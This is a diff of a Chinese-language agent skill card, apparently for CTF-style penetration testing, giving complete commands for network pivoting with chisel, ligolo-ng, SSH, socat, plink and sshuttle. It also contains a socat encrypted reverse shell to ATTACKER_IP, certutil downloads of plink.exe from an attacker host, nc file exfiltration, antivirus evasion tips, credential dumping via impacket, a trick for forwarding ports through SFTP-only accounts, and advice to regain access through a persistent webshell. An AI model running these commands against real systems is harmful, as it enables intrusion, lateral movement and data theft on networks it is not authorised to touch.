@@ -1,10 +1,9 @@
 ---
 name: 'tunneling-port-forwarding'
-description: '隧道和端口转发：chisel/ligolo-ng/ssh -D -R -L/socat relay/plink。多层网络必备。每个场景的完整命令。'
-whenToUse: '内网多层网络/端口转发/出站受限时：按决策树选 chisel/ligolo-ng/ssh 隧道方案。'
+description: '隧道和端口转发：chisel/ligolo-ng/ssh -D -R -L/socat relay/plink。多层网络必备。每个场景的完整命令。（检索词：chisel/ligolo/ssh/socat/tunnel/port-forward/version/静默失败/pivot/proxychains/socks/port forward/port forwarding/tunneling）'
 metadata: { domain: network, tier: T1 }
 ---
-> 📌 DSH 用法：用 skill 工具按名加载本卡。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # 隧道 & 端口转发 — 完整参考
 
@@ -19,17 +18,47 @@ metadata: { domain: network, tier: T1 }
 
 ---
 
+## 🆕 0. 前置判据：**"受限账号" ≠ "没有转发能力"**（2026-10-01 Store Hard 实测）
+
+拿到一个"只能 SFTP / 只能跑某个命令 / rbash"的账号时，**不要顺手把它从转发候选里划掉**。OpenSSH 的两类通道是分开授权的：
+
+| 通道类型 | 触发方式 | `ForceCommand internal-sftp` 会拦吗 | 受谁控制 |
+|---|---|---|---|
+| **session**（shell/exec） | `ssh user@host` / `ssh user@host 'id'` | ✅ 拦（报 `This service allows sftp connections only.`） | `ForceCommand`、`PermitTTY` |
+| **direct-tcpip**（端口转发） | `ssh -N -L` / `-R` / `-D` | ❌ **不拦** | **只看 `AllowTcpForwarding`（默认 yes）** |
+| **subsystem**（sftp） | `sftp user@host` | 放行 | — |
+
+⇒ **"这个账号只能 SFTP" 只说明 session 通道被封，`-L` 照旧可用。** 实测：
+
+```bash
+# 登录报错，但转发照样成功（Store：sftpuser 是 /bin/false + ForceCommand internal-sftp + chroot）
+ssh user@host 'id'
+#   → This service allows sftp connections only.
+sshpass -p "$PW" ssh -N -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+  -L 9230:127.0.0.1:9230 -L 9515:127.0.0.1:9515 user@host      # ← 成功，且能打通本机 loopback 服务
+```
+
+拿到受限账号后的固定动作（三步，30 秒）：
+
+1. **先试 `-L`**，别先试提权/逃逸。失败的判据是 `administratively prohibited: open failed`（= `AllowTcpForwarding no`）或 `ExitOnForwardFailure` 立即退出；**报 "sftp connections only" 不算失败**。
+2. 转发目标**优先选 loopback 上的开发/调试服务**：`/proc/net/tcp` 里 `0A`(LISTEN) 且地址是 `127.0.0.1` 的都值得转 —— Node `--inspect`(9229-9231)、ChromeDriver(9515)、调试器、只监听本机的 DB/管理口（见 `chrome-cdp-discovery`、`unknown-service-probe`）。
+3. 隧道要用 `-o ServerAliveInterval=20` 并放进 tmux/后台；`-L` 是**本地监听**，检查方法 `ss -tlnp | grep <localport>`，不要只看 ssh 进程还在不在。
+
+> 注：`AllowTcpForwarding` 只影响 TCP；还要留意 `PermitOpen`（限制目标 host:port）与 `Match` 块按用户/组覆盖。真被禁时的替代：`sftp` 的 `-D`（很少可用）、或让目标自己发起反向连接（`-R` 同样受 `AllowTcpForwarding` 管）。
+
+---
+
 ## 1. Chisel — 多平台隧道工具 (Go)
 
 ### 1.1 基础架构
 
-```text
+```
 反向模式 (Reverse)：目标主动连接攻击者，攻击者端口映射到目标
   攻击者 ←——— 目标 (出站连接，绕过防火墙)
 
 正向模式 (Forward)：攻击者主动连接目标
   攻击者 ———→ 目标 (需要目标端口可达)
-```text
+```
 
 ### 1.2 反向 SOCKS 代理（最常用）
 
@@ -49,7 +78,7 @@ metadata: { domain: network, tier: T1 }
 # /etc/proxychains4.conf: socks5 127.0.0.1 1080
 proxychains4 nmap -sT -Pn 172.16.1.0/24
 proxychains4 impacket-psexec domain/user:pass@172.16.1.10
-```text
+```
 
 ### 1.3 反向单端口转发
 
@@ -65,7 +94,7 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 # 转发到目标可达的其他内网主机
 ./chisel client ATTACKER_IP:8000 R:1433:192.168.1.50:1433
 # 攻击者本地 1433 → 内网 192.168.1.50:1433
-```text
+```
 
 ### 1.4 正向端口转发
 
@@ -77,7 +106,7 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 # === 攻击者 (Client) ===
 ./chisel client TARGET_IP:8000 0.0.0.0:8080:127.0.0.1:80
 # 攻击者本地 8080 → 目标 127.0.0.1:80（目标本地服务）
-```text
+```
 
 ### 1.5 多客户端管理
 
@@ -92,11 +121,59 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 ./chisel client ATTACKER:8000 R:1081:socks
 
 # proxychains 切换端口即可
-```text
+```
 
 ### 1.6 Chisel 故障排查
 
-```text
+```
+🔴 问题：client 连上了（两边都显示 Connected），但 R: 转发【完全不通】且【不报任何错】
+→ 两端 chisel 版本不一致！(实测: 1.11.6 ↔ 1.10.1)
+  症状极具欺骗性：server 说 Connected、client 也说 Connected、端口也 listen 了，
+  但流量就是过不去，且【零报错】—— 极易误判成"防火墙挡了/目标不通"，白查几小时。
+→ 排查第一步：两端各跑 `./chisel --version` 对比；不一致就换成【完全相同】的版本
+→ 上传前就对齐：先看目标上已有的是哪个版本，攻击机用同一个再上传
+
+🔴 问题：隧道【半死】—— 所有端口都 listen，但真实协议全无响应
+→ 客户端进程已挂死，但 chisel server 的 listener 【仍在 accept TCP】
+   实测症状：`nc -z 127.0.0.1 1389` 报 succeeded（假阳性！），
+             但 ldapsearch / nxc smb 拿到【空输出】，SOCKS5 连 greeting 都不回。
+   根因：listener 由 server 持有（TCP 三次握手成功），dialiing 由 client 做 —— client 死了就黑洞。
+🔴 判据（唯一可靠）：用【真实协议栈】探，不要用 nc -z
+   ldapsearch -x -H ldap://127.0.0.1:1389 -s base -b "" dnsHostName
+   nxc smb 127.0.0.1 --port 1445
+   python3 裸 SOCKS5 握手（greeting 超时 = client 死）
+→ 处置：taskkill /IM chisel.exe /F  →  重启 server  →  重启 client
+
+🎯 **兜底优先级：修隧道之前，先试【目标的外网 IP】**
+靶机的 Web 入口（XAMPP / IIS / 自定义监听）通常**同时挂在它的外网 IP 上**，
+而外网 IP 从攻击机**直连可达，根本不需要任何隧道**。
+```
+实测（Mist）：内部隧道整体挂死、SOCKS 全黑 →
+  直接用 http://<靶机外网IP>/shell.php 恢复命令执行（一次成功）→
+  再用它 taskkill 旧 chisel、重启客户端、补建缺失端口。
+```
+★ 顺序很重要：**先走外网 IP 恢复执行权，再回头修隧道**。反过来会陷在"没有执行权 →
+修不了隧道 → 更没执行权"的死循环里。
+★ 前提：该入口是**持久化**的（文件写在站点目录里），不是内存马 / 只在反弹会话里活着。
+★ 同理适用于任何"上一次留下的 webshell / 上传目录 / 计划任务回连"——先盘点已有资产，
+  不要默认"隧道断了就得从零重打"。
+
+🔴 问题：一个端口绑定失败 → 【整条会话一起报废】
+→ 客户端 stderr：`Connection error: server: Server cannot listen on R:445=>10.0.0.5:445`
+   然后无限退避重试。★ 其它本来能绑定成功的端口（R:socks/R:88/R:389）也一起没了！
+   因为 chisel 把一条 session 的所有 remote 当作原子操作。
+🔴 建隧道前先查本地端口占用：
+   for p in 88 445 5985; do ss -lntH "sport = :$p" | grep -q . && echo "$p BUSY"; done
+   实测踩坑：Kali 的 445 被 ntlmrelayx.py 占、5985 也被占 →
+   必须换成非特权端口 R:1445:…:445、R:15985:…:5985（并把工具指向该端口）。
+→ 只看 server 日志会以为正常：`ss -lntp | grep chisel` 只剩 server 自己的 9001 = 全废了。
+
+🔴 怎么看 Windows 上 chisel 客户端的报错（Start-Process 默认吞掉 stderr）：
+   Start-Process C:\xampp\tmp\chisel.exe -ArgumentList 'client',... `
+     -RedirectStandardError C:\xampp\tmp\ch.err -RedirectStandardOutput C:\xampp\tmp\ch.out -WindowStyle Hidden
+   然后【另起一个请求】Get-Content C:\xampp\tmp\ch.err
+   ★ 坑：webshell 的 system() 会因子进程继承 stdout 句柄而挂住 → 不能在同一个请求里读
+
 问题：client 连上后立刻断开
 → 检查 --reverse 是否在 server 端指定
 → 检查防火墙是否阻断出站
@@ -110,7 +187,7 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 问题：目标不能运行二进制
 → 用较小架构（chisel_1.x_linux_386）
 → 或改用 SSH -R（如果 SSH 可用）
-```text
+```
 
 ---
 
@@ -120,7 +197,7 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 
 ```bash
 # === 创建 TUN 接口 (只需一次) ===
-sudo ip tuntap add user root mode tun ligolo
+sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 
 # === 添加目标网络路由 ===
@@ -133,7 +210,7 @@ sudo ip route add 172.16.0.0/16 dev ligolo
 # === 启动 proxy ===
 ./proxy -selfcert -laddr 0.0.0.0:11601
 # 监听 11601，等待 agent 连接
-```text
+```
 
 ### 2.2 目标端部署
 
@@ -141,7 +218,7 @@ sudo ip route add 172.16.0.0/16 dev ligolo
 # === 目标 (Agent) ===
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
 # 连接成功后，agent 会出现在 proxy 会话列表中
-```text
+```
 
 ### 2.3 Session 管理
 
@@ -152,7 +229,7 @@ ligolo-ng » session 1            # 选择 session 1
 [Agent : user@host] » start      # 启动隧道（关键步骤！）
 [Agent : user@host] » stop       # 停止隧道
 [Agent : user@host] » info       # 查看 agent 信息
-```text
+```
 
 ### 2.4 添加监听器（反向端口转发）
 
@@ -167,7 +244,7 @@ ligolo-ng » session 1            # 选择 session 1
 
 [Agent : user@host] » listener_list
 [Agent : user@host] » listener_del 0
-```text
+```
 
 ### 2.5 Ligolo-ng 使用
 
@@ -177,12 +254,12 @@ ligolo-ng » session 1            # 选择 session 1
 nmap -sT -p 80,443,445 10.10.10.0/24
 xfreerdp /v:10.10.10.50 /u:admin
 smbclient -L //10.10.10.10
-nxc smb 10.10.10.0/24
-```text
+crackmapexec smb 10.10.10.0/24
+```
 
 ### 2.6 Ligolo-ng 故障排查
 
-```text
+```
 问题：session 选不了或 start 无效
 → 确认先运行 session 再选编号
 → agent 断开后重新 connect
@@ -196,7 +273,7 @@ nxc smb 10.10.10.0/24
 → 检查目标 DNS（用 IP）
 → -ignore-cert 不要忘记
 → 目标出站端口是否被限制
-```text
+```
 
 ---
 
@@ -216,7 +293,7 @@ ssh -L 8080:db.internal:80 -L 3389:rdp.internal:3389 user@jumphost
 
 # 例3：只监听本地
 ssh -L 127.0.0.1:8080:internal:80 user@jumphost
-```text
+```
 
 ### 3.2 Remote Forward (-R)：把本地暴露给远程
 
@@ -236,7 +313,7 @@ ssh -R 1433:192.168.1.50:1433 attacker_user@ATTACKER_IP
 # 目标上：
 ssh -R 1080 attacker_user@ATTACKER_IP
 # 攻击者配置 GatewayPorts yes，然后 proxychains 用 127.0.0.1:1080
-```text
+```
 
 ### 3.3 Dynamic SOCKS (-D)：本地 SOCKS 代理
 
@@ -249,7 +326,7 @@ ssh -D 1080 user@10.10.10.5
 
 # 结合 -J 多层跳板
 ssh -D 1080 -J user@jumphost1 user@jumphost2
-```text
+```
 
 ### 3.4 Jump Host (-J)：多层 SSH 跳板
 
@@ -267,7 +344,7 @@ ssh -J user@10.10.10.5:2222 user@internal
 
 # 结合 -D
 ssh -D 1080 -J user@10.10.10.5 user@192.168.1.100
-```text
+```
 
 ### 3.5 后台隧道 (无 TTY)
 
@@ -280,7 +357,7 @@ ssh -T -N -f -L 8080:internal:80 user@jumphost
 
 # 后台 SOCKS
 ssh -T -N -f -D 1080 user@jumphost
-```text
+```
 
 ### 3.6 密码认证自动化
 
@@ -292,7 +369,7 @@ sshpass -p 'P@ssw0rd' ssh -T -N -f -R 8888:localhost:80 user@ATTACKER_IP
 
 # 管道接受 host key
 sshpass -p 'P@ssw0rd' ssh -o StrictHostKeyChecking=no -D 1080 user@host
-```text
+```
 
 ### 3.7 密钥认证
 
@@ -300,11 +377,11 @@ sshpass -p 'P@ssw0rd' ssh -o StrictHostKeyChecking=no -D 1080 user@host
 ssh -i /path/to/id_rsa -D 1080 user@jumphost
 
 ssh -i key -J user@jumphost user@internal
-```text
+```
 
 ### 3.8 SSH 隧道故障排查
 
-```text
+```
 问题：-R 端口攻击者访问不了
 → 检查 /etc/ssh/sshd_config: GatewayPorts yes
 → 重启 sshd: systemctl restart sshd
@@ -318,7 +395,7 @@ ssh -i key -J user@jumphost user@internal
 → Python 替代：
   python -c "import pty; pty.spawn('/bin/bash')"
   然后手动 ssh
-```text
+```
 
 ---
 
@@ -334,7 +411,7 @@ socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.5:80
 
 # 后台运行
 socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80 &
-```text
+```
 
 ### 4.2 反向中继
 
@@ -347,7 +424,7 @@ socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444
 # 目标2（中转）：
 socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:5555
 # 目标1：反弹 shell 到目标2的 4444
-```text
+```
 
 ### 4.3 SSL 加密包装
 
@@ -362,7 +439,7 @@ socat OPENSSL-LISTEN:443,fork,cert=combined.pem,verify=0 TCP:10.0.0.1:80
 
 # === SSL 连接端（目标连接攻击者 SSL）===
 socat TCP-LISTEN:445,fork OPENSSL:ATTACKER_IP:443,verify=0
-```text
+```
 
 ### 4.4 加密反向 Shell 中继
 
@@ -373,11 +450,11 @@ socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork EXEC:/bin/bash
 # 目标（连接 SSL 获得 shell）
 socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid
 # 加密的 bind shell 变体
-```text
+```
 
 ### 4.5 Socat 故障排查
 
-```text
+```
 问题：connection refused
 → 检查防火墙/iptables
 → 确认目标端口有服务在监听
@@ -388,7 +465,7 @@ socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid
 问题：SSL 握手失败
 → verify=0 跳过证书验证
 → 证书文件路径正确
-```text
+```
 
 ---
 
@@ -402,7 +479,7 @@ certutil -urlcache -f http://ATTACKER_IP/plink.exe plink.exe
 
 REM 反向端口转发（让攻击者连目标 RDP）
 plink.exe -P 22 -l user -pw P@ssw0rd -R 3389:127.0.0.1:3389 ATTACKER_IP
-```text
+```
 
 ### 5.2 非交互接受 Host Key
 
@@ -415,7 +492,7 @@ echo 10.10.10.5 ssh-rsa AAAAB3... >> %USERPROFILE%\.ssh\known_hosts
 
 REM 方法3：跳过检查
 plink.exe -P 22 -l user -pw pass -hostkey 11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00 -R 3389:127.0.0.1:3389 ATTACKER_IP
-```text
+```
 
 ### 5.3 其他转发模式
 
@@ -428,11 +505,11 @@ plink.exe -P 22 -l user -pw pass -L 8080:internal:80 ATTACKER_IP
 
 REM 后台运行（Windows）
 start /b plink.exe -P 22 -l user -pw pass -R 3389:127.0.0.1:3389 ATTACKER_IP
-```text
+```
 
 ### 5.4 plink 故障排查
 
-```text
+```
 问题：plink.exe 在 Windows 上被杀软拦
 → 改名或用其他扩展名 (.dat, .log)
 → 用 certutil 下载更隐蔽
@@ -444,7 +521,7 @@ start /b plink.exe -P 22 -l user -pw pass -R 3389:127.0.0.1:3389 ATTACKER_IP
 问题：无 plink 可用
 → 用系统自带 ssh.exe (Win10+)
   ssh -R 3389:127.0.0.1:3389 user@ATTACKER_IP
-```text
+```
 
 ---
 
@@ -464,7 +541,7 @@ sshuttle -r user@host --auto-nets
 
 # 指定 DNS 也走隧道
 sshuttle --dns -r user@host 10.10.10.0/24
-```text
+```
 
 ### 6.2 高级选项
 
@@ -480,20 +557,20 @@ sshuttle -r user@host --auto-nets --exclude 192.168.0.0/16
 
 # 守护进程模式
 sshuttle -D -r user@host 10.10.10.0/24
-```text
+```
 
 ### 6.3 与 proxychains 对比
 
-```text
+```
 SSHuttle 优势：透明代理，任意程序可用，支持 UDP（部分），无需改工具
 SSHuttle 限制：需要 SSH 访问 + Python + sudo（本地创建 TUN）
 Proxychains 优势：无需 sudo，纯用户态
 Proxychains 限制：仅 TCP，需要工具适配 proxychains 前缀
-```text
+```
 
 ### 6.4 SSHuttle 故障排查
 
-```text
+```
 问题：sudo 密码弹窗
 → sshuttle 本地需要 root 权限创建 TUN
 → 或预先配好 sudo NOPASSWD
@@ -506,7 +583,7 @@ Proxychains 限制：仅 TCP，需要工具适配 proxychains 前缀
 问题：目标没有 Python
 → sshuttle 需要远程 Python 环境
 → 无法使用时退到 SSH -D + proxychains
-```text
+```
 
 ---
 
@@ -530,7 +607,7 @@ socks5 127.0.0.1 1080            # Chisel SOCKS
 # [ProxyList]
 # socks5 127.0.0.1 1080
 # socks5 127.0.0.1 1081
-```text
+```
 
 ### 7.2 常用命令组合
 
@@ -545,7 +622,7 @@ proxychains4 impacket-secretsdump domain/user:pass@172.16.1.10
 proxychains4 impacket-wmiexec domain/user:pass@172.16.1.10
 
 # CrackMapExec
-proxychains4 nxc smb 172.16.1.0/24 -u user -p pass -d domain
+proxychains4 crackmapexec smb 172.16.1.0/24 -u user -p pass -d domain
 
 # RDP / VNC
 proxychains4 xfreerdp /v:172.16.1.10 /u:admin /p:pass
@@ -554,11 +631,11 @@ proxychains4 vncviewer 172.16.1.10
 # Web
 proxychains4 curl http://172.16.1.10/internal
 proxychains4 wget http://172.16.1.10/file.txt
-```text
+```
 
 ### 7.3 Proxychains 故障排查
 
-```text
+```
 问题：proxychains 无输出，直接退出
 → 检查配置文件中代理地址和端口
 → 确认 SOCKS 端口确实在监听 (ss -tlnp)
@@ -572,7 +649,7 @@ proxychains4 wget http://172.16.1.10/file.txt
 → proxychains4 仅支持 TCP
 → DNS 走 UDP 也会失败，用 IP 地址
 → 需要 UDP：考虑 sshuttle 或 ligolo-ng
-```text
+```
 
 ---
 
@@ -580,7 +657,7 @@ proxychains4 wget http://172.16.1.10/file.txt
 
 ### 场景 1：Web 服务器双网卡，有 MSSQL 在内网
 
-```text
+```
 拓扑：攻击者 → 192.168.1.10:80 (目标 web)
               目标 → 10.0.0.50:1433 (内网 MSSQL)
 
@@ -592,11 +669,11 @@ proxychains4 wget http://172.16.1.10/file.txt
 方案 B：SSH 反向（目标有 SSH 出站）
   目标:   ssh -R 1433:10.0.0.50:1433 attacker@ATTACKER_IP
   攻击者: impacket-mssqlclient user:pass@127.0.0.1 -port 1433
-```text
+```
 
 ### 场景 2：双网卡主机，需要扫描第二层网络
 
-```text
+```
 拓扑：攻击者 → 10.10.10.5:22 (边界)
               边界 → 172.16.1.0/24 (内网)
 
@@ -608,7 +685,7 @@ proxychains4 wget http://172.16.1.10/file.txt
   边界:   ./agent -connect ATTACKER:11601 -ignore-cert
   攻击者: session 1 → start
           nmap -sT 172.16.1.0/24
-          nxc smb 172.16.1.0/24
+          crackmapexec smb 172.16.1.0/24
 
 方案 B：SSH -D + proxychains
   攻击者: ssh -D 1080 user@10.10.10.5
@@ -617,11 +694,11 @@ proxychains4 wget http://172.16.1.10/file.txt
 方案 C：SSHuttle
   sshuttle -r user@10.10.10.5 172.16.1.0/24
   nmap -sT 172.16.1.0/24   # 无需 proxychains！
-```text
+```
 
 ### 场景 3：目标只有出站 SSH，无其他工具
 
-```text
+```
 拓扑：攻击者监听 22，目标可出站 SSH
 
 方案 A：SSH 反向 SOCKS
@@ -638,11 +715,11 @@ proxychains4 wget http://172.16.1.10/file.txt
   目标:   ssh -R 445:172.16.1.10:445 -R 3389:172.16.1.5:3389 attacker@ATTACKER_IP
   攻击者: smbclient -L //127.0.0.1
           xfreerdp /v:127.0.0.1:3389
-```text
+```
 
 ### 场景 4：多层内网（跳板→跳板→目标）
 
-```text
+```
 拓扑：攻击者 → 10.10.10.5 (跳板1) → 172.16.1.10 (跳板2) → 192.168.1.0/24
 
 方案：SSH -J 多跳 + -D
@@ -655,11 +732,11 @@ proxychains4 wget http://172.16.1.10/file.txt
   # 通过 proxychains+跳板1 SOCKS 把 chisel 传到跳板2
   跳板2:  proxychains4 ./chisel client ATTACKER:8000 R:1081:socks  # 第二段
   # 现在 proxychains 配 1081 就能到最深层
-```text
+```
 
 ### 场景 5：纯 Windows 环境
 
-```text
+```
 方案：plink.exe 或系统自带 ssh.exe
   # Windows 10+ 自带 OpenSSH
   ssh -R 3389:127.0.0.1:3389 attacker@ATTACKER_IP
@@ -672,7 +749,7 @@ proxychains4 wget http://172.16.1.10/file.txt
   攻击者 → 目标(Windows,双网卡) → 内网 RDP
   目标: ssh -R 3389:192.168.1.10:3389 attacker@ATTACKER_IP
   攻击者: xfreerdp /v:127.0.0.1:3389 /u:admin /p:pass
-```text
+```
 
 ---
 
@@ -693,7 +770,7 @@ echo "BASE64_STRING" | base64 -d > file
 # Windows
 certutil -encode file encoded.txt
 certutil -decode encoded.txt file
-```text
+```
 
 ### 9.2 Python HTTP（配合隧道）
 
@@ -707,7 +784,7 @@ python3 -m http.server 8000
 # 攻击者通过隧道下载
 proxychains4 curl http://172.16.1.50:8000/chisel -o chisel
 proxychains4 wget http://192.168.1.100:8000/nc.exe
-```text
+```
 
 ### 9.3 SCP 跳板传送
 
@@ -720,7 +797,7 @@ scp -J jumpuser@10.10.10.5 user@192.168.1.100:/path/file ./localfile
 
 # 多层跳板
 scp -o 'ProxyJump user1@10.10.10.5,user2@172.16.1.10' file user3@192.168.1.1:/tmp/
-```text
+```
 
 ### 9.4 Netcat 通过隧道
 
@@ -729,13 +806,13 @@ scp -o 'ProxyJump user1@10.10.10.5,user2@172.16.1.10' file user3@192.168.1.1:/tm
 socat TCP-LISTEN:9999,fork TCP:127.0.0.1:1081 &
 # 目标发送
 nc -w 3 ATTACKER_IP 9999 < file
-```text
+```
 
 ---
 
 ## 10. 工具选择决策树
 
-```text
+```
 目标有 SSH 出站？
 ├─ YES → SSH -D（简单）/ SSHuttle（透明）/ SSH -R（端口转发）
 │         ├─ 需要透明代理？ → SSHuttle
@@ -757,7 +834,7 @@ nc -w 3 ATTACKER_IP 9999 < file
    ├─ SSH -J 链式跳板
    ├─ Ligolo-ng（天然支持多层路由）
    └─ Chisel 串联 SOCKS
-```text
+```
 
 ---
 
@@ -772,7 +849,7 @@ nc -w 3 ATTACKER_IP 9999 < file
 
 # ============ Ligolo-ng ==========
 # 透明代理（最强大）
-攻击者: sudo ip tuntap add user root mode tun ligolo
+攻击者: sudo ip tuntap add user $(whoami) mode tun ligolo
         sudo ip link set ligolo up
         sudo ip route add NET/SUBNET dev ligolo
         ./proxy -selfcert -laddr 0.0.0.0:11601
@@ -797,8 +874,8 @@ socat TCP-LISTEN:PORT,fork TCP:TARGET:PORT
 
 # ============ Proxychains ============
 proxychains4 nmap -sT -Pn TARGET
-proxychains4 nxc smb TARGET
-```text
+proxychains4 crackmapexec smb TARGET
+```
 
 ---
 
